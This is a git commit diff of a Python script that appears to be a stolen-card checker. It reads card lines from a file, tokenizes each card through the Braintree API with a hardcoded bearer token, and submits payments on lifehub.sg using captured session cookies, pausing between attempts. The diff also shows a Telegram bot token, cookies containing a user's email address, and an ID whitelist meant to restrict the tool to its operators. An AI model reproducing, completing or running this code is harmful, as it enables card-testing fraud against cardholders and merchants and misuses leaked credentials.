acf8de50118c91400dc2894ffdec75357978865e
b6qm <modca1008@gmail.com>
2024-12-06 19:36:36 +0100

    Update 0ile.py

--- 0ile.py
+++ 0ile.py
@@ -1,3 +1,17 @@
+O =  '\033[1;31m' #Red.... like< Red Line > only Anime fan will know☆
+Z =  '\033[1;37m' #white
+F = '\033[1;32m' #Green
+B = '\033[2;36m' #Light Blue
+X = '\033[1;33m' #Yellow
+C = '\033[2;35m' #Purple
+from cfonts import render  
+#print("\x1b[1;39m","_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ")          
+output = render('MODCA', colors=['white', 'red'], align='center')
+print(output)
+
+print("~ 𝗣яσɢяαммεя • 𝗠𝗼𝗱𝗰𝗮 • -> @B_6_Q ~ 𝗖нαиияℓ : @ModcaTheLost ~")
+print('\033[1;31m_' * 60)
+print('\n')
 import sys
 
 authorized_users = [1296559148, 5966873984, 1296559148, 6695873549, 5702803191, 6174126557, 5612427625, 1970257616, 7408511525, 912917157, 6603688300]
@@ -8,27 +22,22 @@ def check_authorized(user_id):
     else:
         return False
 
-user = int(input("Enter Your ID: "))
+user = int(input(f"{O}Enter Your ID : "))
 
 if check_authorized(user):
     print("تم تفعيل الأداة بنجاح، مرحبًا بك!")
 else:
-    print("غير مصرح لك بتشغيل هذه الأداة.")
+    print(f"{Z}   غير مصرح لك بتشغيل هذه الأداة.")
+    print('\n')
     print('Tσσℓѕ Sтσρрє∂ ')
+    print('\n')
     print('لا تحاول تسحب روابط | Protect By ModcaPy | ~ @B_6_Q ~ ')
-    print('< 𝗠𝗼𝗱𝗰𝗮 𓏺 𝗧𝗵𝗲 𝗟𝗼𝘀𝘁 🇬🇧 > @B_6_Q')
+    print('\n')
+    
     print('https://t.me/ModcaTheLost ')
     print('هذه قناة التحديثات انضم وانتظر التحديثات ')
     sys.exit()
-
-
-
-#
-
-
     
-import os,user_agent,fake_useragent
-from cfonts import render, say
 try:
 	import requests
 except ModuleNotFoundError:
@@ -54,41 +63,17 @@ except ModuleNotFoundError:
 	print("- 𝗠σ𝗗υℓє 𝗘яяσя • انت غير مثبت المكتبة المطلوبة جاري تثبيتها..")
 	os.system('pip install python-cfonts')
 	
+    
+import os,user_agent,fake_useragent
+from cfonts import render, say
 import requests,time,webbrowser,json,os,sys,re,user_agent,random
 from cfonts import render, say
 import random,string,user_agent,base64
 from fake_useragent import UserAgent
-#from bin_info_v1 import bin_info
-webbrowser.open('https://t.me/ModcaTheLost')
-try:
-	import requests
-except ModuleNotFoundError:
-	print("- 𝗠σ𝗗υℓє 𝗘яяσя • انت غير مثبت المكتبة المطلوبة جاري تثبيتها..")
-	os.system('pip install requests')
-try:
-	from user_agent import generate_user_agent
-except ModuleNotFoundError:
-	print("- 𝗠σ𝗗υℓє 𝗘яяσя • انت غير مثبت المكتبة المطلوبة جاري تثبيتها..")
-	os.system('pip install user_agent')
-	
-try:
-	from cfonts import render  
-except ModuleNotFoundError:
-	print("- 𝗠σ𝗗υℓє 𝗘яяσя • انت غير مثبت المكتبة المطلوبة جاري تثبيتها..")
-	os.system('pip install python-cfonts')
-	
-try:
-	 import user_agent
-except ModuleNotFoundError:
-	print("- 𝗠σ𝗗υℓє 𝗘яяσя • انت غير مثبت المكتبة المطلوبة جاري تثبيتها..")
-	os.system('pip install user_agent')
-#webbrowser.open('https://t.me/+UO1DPQYFMcpkY2Y0')
-user = user_agent.generate_user_agent()
-		
-r = requests.session()
-	
+
+user = user_agent.generate_user_agent()		
+r = requests.session()	
 r.follow_redirects = True
-	
 r.verify = False
 
 token2 = '6913577462:AAELQiwLjFjeKZgR2DXu4KXMPOnDoPAYkGg'
@@ -114,11 +99,11 @@ lo(" \x1b[1;36m      𝐖𝐚𝐢𝐭.𝐅𝐨𝐫 𝐀𝐜𝐭𝐢𝐯𝐢𝐭�
 os.system('clear')            
 from cfonts import render  
 #print("\x1b[1;39m","_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ")          
-output = render('MODCA', colors=['white', 'magenta'], align='center')
+output = render('MODCA', colors=['white', 'red'], align='center')
 print(output)
 
-print("      ~ 𝗣яσɢяαммεя • 𝗠𝗼𝗱𝗰𝗮 • -> @B_6_Q ~ 𝗖нαиияℓ : @ModcaTheLost ~")
-print("\x1b[38;5;5m—" * 72)
+print("~ 𝗣яσɢяαммεя • 𝗠𝗼𝗱𝗰𝗮 • -> @B_6_Q ~ 𝗖нαиияℓ : @ModcaTheLost ~")
+print('\033[1;31m_' * 60)
 print('\n')
 
 token = input('Enter Your Token : ')
@@ -151,7 +136,7 @@ for P in file.readlines():
         'authority': 'payments.braintree-api.com',
         'accept': '*/*',
         'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,fr-FR;q=0.6,fr;q=0.5',
-        'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzM0NzA1MDIsImp0aSI6IjdkMzE5MDhiLTNmNjYtNGE1NS1iYTUxLWY1MGY5NzU1ZjM2YSIsInN1YiI6InBiZ2dxNTZyNzR5NjVmZ3giLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InBiZ2dxNTZyNzR5NjVmZ3giLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.a05xqrqD1SRLeqDHiGau7T_qRq_7_COPNkF7Oa8S8FmVCy1yyk80VtSrDnhaCdr0gywFxSYSja0Qc7z8sgu1TA',
+        'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzM1OTU0MjMsImp0aSI6IjZjOGVlYWIxLTc5M2QtNGNlNC1hYThkLWRiNzQ1OTdiYWM3ZiIsInN1YiI6InBiZ2dxNTZyNzR5NjVmZ3giLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InBiZ2dxNTZyNzR5NjVmZ3giLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.GdpTK5PneGhga-lUZqdmYG2GqjvNwtuILiLtU6CgkVhFlfcT7NMSfJoNNbqbKV9SM-js7lOuv-Li4-YPLgSsRg',
         'braintree-version': '2018-05-10',
         'content-type': 'application/json',
         'origin': 'https://assets.braintreegateway.com',
@@ -169,7 +154,7 @@ for P in file.readlines():
         'clientSdkMetadata': {
             'source': 'client',
             'integration': 'custom',
-            'sessionId': 'adceb70c-ba79-4923-995f-ee4b5764b4f1',
+            'sessionId': '40cc3715-f9ef-45e0-ba0d-195c00669f68',
         },
         'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
         'variables': {
@@ -193,8 +178,11 @@ for P in file.readlines():
     
     
 	
-    tok = (response.json()['data']['tokenizeCreditCard']['token'])
-			
+    try:
+        tok = (response.json()['data']['tokenizeCreditCard']['token'])
+    except TypeError:
+        print('Call Modca')	
+        sys.exit()  
 			
     cookies = {
         'visid_incap_2624039': '/fudJLClQs259Q/frigJRaf9JWcAAAAAQUIPAAAAAACwGwdp3k0cPOgqg6iEYAFh',
@@ -206,13 +194,12 @@ for P in file.readlines():
         '1': 'qprkeaqJ4xw2rqUU1qlYOf2Nv9xHwtKz1xbvfa0AXtQ2I1e7AKBmJwp6rI5dJW8mIFZz7P/yxH/uYK9y8tfPcuZ+y7V6zrBwdEocWcx3f6Wp5lI5OZBE0b6wR0U72GyaWwUGEiy67m7FoyC5fxgPqzehxZAeO+uVVQWm+9/JA2begjVXFmEPgvZd00Z/C9EGWNkBmlA/EBMZ9/yC3AqzuRgtEPXNl4oHuQt7rebwVSpZFcGPbWZLp5jqHfdrbtCBjHxMDYVrJJotrxyu5pwnHhWfyz4hA38tWxasE5Qq+pwuc8wu2AcPGENOA7gpr9w/TILvB8fecmmVxOeU3BtaDO5hHsF9SbyNx9dFUVhI3mxm9o6hIma97jlePMhGS2J7Ph2CXM3l/izA9LYFHz9i99H2ZeVmsNphqvaXz6uDYJx5wLYF3fRuSk/+9Ix3BUjYsBGHMPQXX5AGo9bqS1MSy5i308so+iv2uTJsiWGUQ8OHSHq+VAM0G4lb0RmDwYfhq5HYr9erH5r5EMzHUR3ABYBISHyzqYWmuv+YLFMNofIJmh8QVK0HseQiDqeWFR6PVjY+W+9WXWh4xfpM56sivqMjb2GuxDrtPjvQaCzqvWMqU/2KWOA+z9Z8ejwN5VeEKn3P2LY83OpIbCGjeuAOQ3rkMVtsCBb4YAMD/QHQTok4yKRT7TrUBbs6HHBwjMnRbRxKClBEbH1EZnXi/3tSHIb1MJBnFInxSveE7iGlWVFf7ha6XjFgsFim4YYggOOzr49w1LMhirbb+MbvWGYDz5cfmY629Wiups+r2CE0QUVoDkcCKHbc8kmPmKIwACA3rzS1bg0sKLWlSuP8b3nojEsbxVd5SfVLmO7mcQenEbHfb6qTSzBjV4+UC4MoG4TAxBo02b+ZqI+40/RYidhV3HagZ/gvo+h6Ta6CIpA8Gqcnc54w7blsL4EW7FtgPij/uJeklAAOcrrbBIoZqka9He+hjsedubOquBoHbzYsdG7EPNpEzhNAL7zNBr/oy5Ms+rhy5Q/1k29h8EfrmPn7dSLlcPrj8q2zpYQdIK9/M6662bSycBGoiISR+lyokXDcjnfk+xcuiqGspiyJYdXJRcPGC86i41XX2krFMz8yKSHeGPNqhBVGres83YG7j25cYST0/JGWkx9d2yjNq0lMK0DdC5WOl6pGn2vkpZsEhHM0sGrfrcjabZKv2zIKwe0Ce2n+2u54uX74wZ5bFMuMkDlfhIrczkP9ETXFdDNINt8PUoiktZ6iQse251KHnFp3vXZVrLX1KeuXoosnljb7svjylzdr7XmheoXgsJv1cshNpCAllpGlgAMt7beb2nWeYpfjpMk4pQGRLWrgXvH4P6/haGR2oHNOhCtiWbmTREZFpDKY1AO9nbxZPFxZq1x/KuSs+0QVdrikPe00APZWIVCgo1qgfUXVwDNdM3Docuw=',
         '2': 'Z6OyVWr1doyVFeSR8nGuVqBoBoW4V7ZWDoR/UiprSFVD1N8dAZWldL/dg9JZ29SgYuPEg463VdajsFXtQjRWLJo/eCRt8cjCWeQXZEKh9XLPWhTYut+cOMKTTDm20KUxt+wLzwiMj0wVNZIBNbl7bw==',
         'nr2ApolloUser_CS': 'crf%3dkHUF%2f2SaeYof2VV0aUMllJQo6V4%3d%3buid%3d1338501%3bunm%3dnikmokbb321%40gmail.com',
-        'osVisit': '4bded4e4-8b7c-4d2d-8cb0-6b34d9c069dd',
-        'nlbi_2624039': 'Qz2OP/R8ODViu0Csnrr3FQAAAABKtHXaF2oI/r/N0hDyVTae',
-        'incap_ses_1173_2624039': 'VSszWdHcTCycwVCgflVHEJ5XUWcAAAAAWl4UwuyJjxYxHLpE0jF3bA==',
-        'ASP.NET_SessionId': 'pjnzme3xhvwxsnrzlr1f44fy',
-        '_ga_WSCFS5WWZ0': 'GS1.1.1733384101.19.0.1733384101.0.0.0',
-        'incap_ses_188_2624039': '9iG3IJs71CHzYnhGNOmbAqFaUWcAAAAAHb18ZgcBEt4jHneBLHJqgw==',
-        'nr1ApolloUser_CS': 'lid%3dup8g6a3gUUr2r4Cd1I%2btqQ%3d%3d0LWNjxz81NGX12YtygTBxg%3d%3d%3btuu%3d63868981969%3bexp%3d63871573669%3brhs%3dqmqs21oSCQNMIa57tnJPUgE%2bd9A%3d%3bhmc%3dVIE326X1Pc0Duy6u%2fJ%2fjn8D%2b4jw%3d',
+        'nlbi_2624039': 'Wi6UQvoUAxs/l3zQnrr3FQAAAAAT6F5ms66+16rcPcs0GlOf',
+        'incap_ses_1176_2624039': '3XMhewaqoGvS9kY48f1REEo/U2cAAAAAeIZuMV++140inZat0VVv8A==',
+        'osVisit': 'baacbb91-44b8-4281-872e-44adc5954d1a',
+        'nr1ApolloUser_CS': 'lid%3dup8g6a3gUUr2r4Cd1I%2btqQ%3d%3d0LWNjxz81NGX12YtygTBxg%3d%3d%3btuu%3d63869106043%3bexp%3d63871697743%3brhs%3dqmqs21oSCQNMIa57tnJPUgE%2bd9A%3d%3bhmc%3dftzFi1VOVlc7oGU64PCjwJqcI3g%3d',
+        'ASP.NET_SessionId': 'gk3elbclaebet334psrnyuv5',
+        '_ga_WSCFS5WWZ0': 'GS1.1.1733508947.20.1.1733509023.0.0.0',
     }
     
     headers = {
@@ -220,9 +207,9 @@ for P in file.readlines():
         'accept': 'application/json',
         'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,fr-FR;q=0.6,fr;q=0.5',
         'content-type': 'application/json; charset=UTF-8',
-        # 'cookie': 'visid_incap_2624039=/fudJLClQs259Q/frigJRaf9JWcAAAAAQUIPAAAAAACwGwdp3k0cPOgqg6iEYAFh; osVisitor=1875de0b-9cfb-4cfe-bd66-744771ee42be; _gcl_au=1.1.346592010.1730543022; _ga=GA1.1.214830494.1730543022; _fbp=fb.1.1730543022262.343117564879421434; 3=ojJZPmMTWhk6Eoktt4P0sLYbyoxcvpDOLoIHrMiWbkb3sEDeFRggBeGcz9t4u3fu85dSTjv85ayO4bZOJaLxUN0hWlPNubrIxr9o3oX766SNWsZrG+NsNsprBzCVdEX1; 1=qprkeaqJ4xw2rqUU1qlYOf2Nv9xHwtKz1xbvfa0AXtQ2I1e7AKBmJwp6rI5dJW8mIFZz7P/yxH/uYK9y8tfPcuZ+y7V6zrBwdEocWcx3f6Wp5lI5OZBE0b6wR0U72GyaWwUGEiy67m7FoyC5fxgPqzehxZAeO+uVVQWm+9/JA2begjVXFmEPgvZd00Z/C9EGWNkBmlA/EBMZ9/yC3AqzuRgtEPXNl4oHuQt7rebwVSpZFcGPbWZLp5jqHfdrbtCBjHxMDYVrJJotrxyu5pwnHhWfyz4hA38tWxasE5Qq+pwuc8wu2AcPGENOA7gpr9w/TILvB8fecmmVxOeU3BtaDO5hHsF9SbyNx9dFUVhI3mxm9o6hIma97jlePMhGS2J7Ph2CXM3l/izA9LYFHz9i99H2ZeVmsNphqvaXz6uDYJx5wLYF3fRuSk/+9Ix3BUjYsBGHMPQXX5AGo9bqS1MSy5i308so+iv2uTJsiWGUQ8OHSHq+VAM0G4lb0RmDwYfhq5HYr9erH5r5EMzHUR3ABYBISHyzqYWmuv+YLFMNofIJmh8QVK0HseQiDqeWFR6PVjY+W+9WXWh4xfpM56sivqMjb2GuxDrtPjvQaCzqvWMqU/2KWOA+z9Z8ejwN5VeEKn3P2LY83OpIbCGjeuAOQ3rkMVtsCBb4YAMD/QHQTok4yKRT7TrUBbs6HHBwjMnRbRxKClBEbH1EZnXi/3tSHIb1MJBnFInxSveE7iGlWVFf7ha6XjFgsFim4YYggOOzr49w1LMhirbb+MbvWGYDz5cfmY629Wiups+r2CE0QUVoDkcCKHbc8kmPmKIwACA3rzS1bg0sKLWlSuP8b3nojEsbxVd5SfVLmO7mcQenEbHfb6qTSzBjV4+UC4MoG4TAxBo02b+ZqI+40/RYidhV3HagZ/gvo+h6Ta6CIpA8Gqcnc54w7blsL4EW7FtgPij/uJeklAAOcrrbBIoZqka9He+hjsedubOquBoHbzYsdG7EPNpEzhNAL7zNBr/oy5Ms+rhy5Q/1k29h8EfrmPn7dSLlcPrj8q2zpYQdIK9/M6662bSycBGoiISR+lyokXDcjnfk+xcuiqGspiyJYdXJRcPGC86i41XX2krFMz8yKSHeGPNqhBVGres83YG7j25cYST0/JGWkx9d2yjNq0lMK0DdC5WOl6pGn2vkpZsEhHM0sGrfrcjabZKv2zIKwe0Ce2n+2u54uX74wZ5bFMuMkDlfhIrczkP9ETXFdDNINt8PUoiktZ6iQse251KHnFp3vXZVrLX1KeuXoosnljb7svjylzdr7XmheoXgsJv1cshNpCAllpGlgAMt7beb2nWeYpfjpMk4pQGRLWrgXvH4P6/haGR2oHNOhCtiWbmTREZFpDKY1AO9nbxZPFxZq1x/KuSs+0QVdrikPe00APZWIVCgo1qgfUXVwDNdM3Docuw=; 2=Z6OyVWr1doyVFeSR8nGuVqBoBoW4V7ZWDoR/UiprSFVD1N8dAZWldL/dg9JZ29SgYuPEg463VdajsFXtQjRWLJo/eCRt8cjCWeQXZEKh9XLPWhTYut+cOMKTTDm20KUxt+wLzwiMj0wVNZIBNbl7bw==; nr2ApolloUser_CS=crf%3dkHUF%2f2SaeYof2VV0aUMllJQo6V4%3d%3buid%3d1338501%3bunm%3dnikmokbb321%40gmail.com; osVisit=4bded4e4-8b7c-4d2d-8cb0-6b34d9c069dd; nlbi_2624039=Qz2OP/R8ODViu0Csnrr3FQAAAABKtHXaF2oI/r/N0hDyVTae; incap_ses_1173_2624039=VSszWdHcTCycwVCgflVHEJ5XUWcAAAAAWl4UwuyJjxYxHLpE0jF3bA==; ASP.NET_SessionId=pjnzme3xhvwxsnrzlr1f44fy; _ga_WSCFS5WWZ0=GS1.1.1733384101.19.0.1733384101.0.0.0; incap_ses_188_2624039=9iG3IJs71CHzYnhGNOmbAqFaUWcAAAAAHb18ZgcBEt4jHneBLHJqgw==; nr1ApolloUser_CS=lid%3dup8g6a3gUUr2r4Cd1I%2btqQ%3d%3d0LWNjxz81NGX12YtygTBxg%3d%3d%3btuu%3d63868981969%3bexp%3d63871573669%3brhs%3dqmqs21oSCQNMIa57tnJPUgE%2bd9A%3d%3bhmc%3dVIE326X1Pc0Duy6u%2fJ%2fjn8D%2b4jw%3d',
+        # 'cookie': 'visid_incap_2624039=/fudJLClQs259Q/frigJRaf9JWcAAAAAQUIPAAAAAACwGwdp3k0cPOgqg6iEYAFh; osVisitor=1875de0b-9cfb-4cfe-bd66-744771ee42be; _gcl_au=1.1.346592010.1730543022; _ga=GA1.1.214830494.1730543022; _fbp=fb.1.1730543022262.343117564879421434; 3=ojJZPmMTWhk6Eoktt4P0sLYbyoxcvpDOLoIHrMiWbkb3sEDeFRggBeGcz9t4u3fu85dSTjv85ayO4bZOJaLxUN0hWlPNubrIxr9o3oX766SNWsZrG+NsNsprBzCVdEX1; 1=qprkeaqJ4xw2rqUU1qlYOf2Nv9xHwtKz1xbvfa0AXtQ2I1e7AKBmJwp6rI5dJW8mIFZz7P/yxH/uYK9y8tfPcuZ+y7V6zrBwdEocWcx3f6Wp5lI5OZBE0b6wR0U72GyaWwUGEiy67m7FoyC5fxgPqzehxZAeO+uVVQWm+9/JA2begjVXFmEPgvZd00Z/C9EGWNkBmlA/EBMZ9/yC3AqzuRgtEPXNl4oHuQt7rebwVSpZFcGPbWZLp5jqHfdrbtCBjHxMDYVrJJotrxyu5pwnHhWfyz4hA38tWxasE5Qq+pwuc8wu2AcPGENOA7gpr9w/TILvB8fecmmVxOeU3BtaDO5hHsF9SbyNx9dFUVhI3mxm9o6hIma97jlePMhGS2J7Ph2CXM3l/izA9LYFHz9i99H2ZeVmsNphqvaXz6uDYJx5wLYF3fRuSk/+9Ix3BUjYsBGHMPQXX5AGo9bqS1MSy5i308so+iv2uTJsiWGUQ8OHSHq+VAM0G4lb0RmDwYfhq5HYr9erH5r5EMzHUR3ABYBISHyzqYWmuv+YLFMNofIJmh8QVK0HseQiDqeWFR6PVjY+W+9WXWh4xfpM56sivqMjb2GuxDrtPjvQaCzqvWMqU/2KWOA+z9Z8ejwN5VeEKn3P2LY83OpIbCGjeuAOQ3rkMVtsCBb4YAMD/QHQTok4yKRT7TrUBbs6HHBwjMnRbRxKClBEbH1EZnXi/3tSHIb1MJBnFInxSveE7iGlWVFf7ha6XjFgsFim4YYggOOzr49w1LMhirbb+MbvWGYDz5cfmY629Wiups+r2CE0QUVoDkcCKHbc8kmPmKIwACA3rzS1bg0sKLWlSuP8b3nojEsbxVd5SfVLmO7mcQenEbHfb6qTSzBjV4+UC4MoG4TAxBo02b+ZqI+40/RYidhV3HagZ/gvo+h6Ta6CIpA8Gqcnc54w7blsL4EW7FtgPij/uJeklAAOcrrbBIoZqka9He+hjsedubOquBoHbzYsdG7EPNpEzhNAL7zNBr/oy5Ms+rhy5Q/1k29h8EfrmPn7dSLlcPrj8q2zpYQdIK9/M6662bSycBGoiISR+lyokXDcjnfk+xcuiqGspiyJYdXJRcPGC86i41XX2krFMz8yKSHeGPNqhBVGres83YG7j25cYST0/JGWkx9d2yjNq0lMK0DdC5WOl6pGn2vkpZsEhHM0sGrfrcjabZKv2zIKwe0Ce2n+2u54uX74wZ5bFMuMkDlfhIrczkP9ETXFdDNINt8PUoiktZ6iQse251KHnFp3vXZVrLX1KeuXoosnljb7svjylzdr7XmheoXgsJv1cshNpCAllpGlgAMt7beb2nWeYpfjpMk4pQGRLWrgXvH4P6/haGR2oHNOhCtiWbmTREZFpDKY1AO9nbxZPFxZq1x/KuSs+0QVdrikPe00APZWIVCgo1qgfUXVwDNdM3Docuw=; 2=Z6OyVWr1doyVFeSR8nGuVqBoBoW4V7ZWDoR/UiprSFVD1N8dAZWldL/dg9JZ29SgYuPEg463VdajsFXtQjRWLJo/eCRt8cjCWeQXZEKh9XLPWhTYut+cOMKTTDm20KUxt+wLzwiMj0wVNZIBNbl7bw==; nr2ApolloUser_CS=crf%3dkHUF%2f2SaeYof2VV0aUMllJQo6V4%3d%3buid%3d1338501%3bunm%3dnikmokbb321%40gmail.com; nlbi_2624039=Wi6UQvoUAxs/l3zQnrr3FQAAAAAT6F5ms66+16rcPcs0GlOf; incap_ses_1176_2624039=3XMhewaqoGvS9kY48f1REEo/U2cAAAAAeIZuMV++140inZat0VVv8A==; osVisit=baacbb91-44b8-4281-872e-44adc5954d1a; nr1ApolloUser_CS=lid%3dup8g6a3gUUr2r4Cd1I%2btqQ%3d%3d0LWNjxz81NGX12YtygTBxg%3d%3d%3btuu%3d63869106043%3bexp%3d63871697743%3brhs%3dqmqs21oSCQNMIa57tnJPUgE%2bd9A%3d%3bhmc%3dftzFi1VOVlc7oGU64PCjwJqcI3g%3d; ASP.NET_SessionId=gk3elbclaebet334psrnyuv5; _ga_WSCFS5WWZ0=GS1.1.1733508947.20.1.1733509023.0.0.0',
         'origin': 'https://www.lifehub.sg',
-        'referer': 'https://www.lifehub.sg/product-payment?_ts=1731776697012',
+        'referer': 'https://www.lifehub.sg/product-payment',
         'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
         'sec-ch-ua-mobile': '?1',
         'sec-ch-ua-platform': '"Android"',
@@ -566,5 +553,5 @@ for P in file.readlines():
         
 
     else:
-    	print(P,'>>',response.json())
-    time.sleep(30)
+    	print('{X} New RespoNsE ✨ ')
+    time.sleep(25)
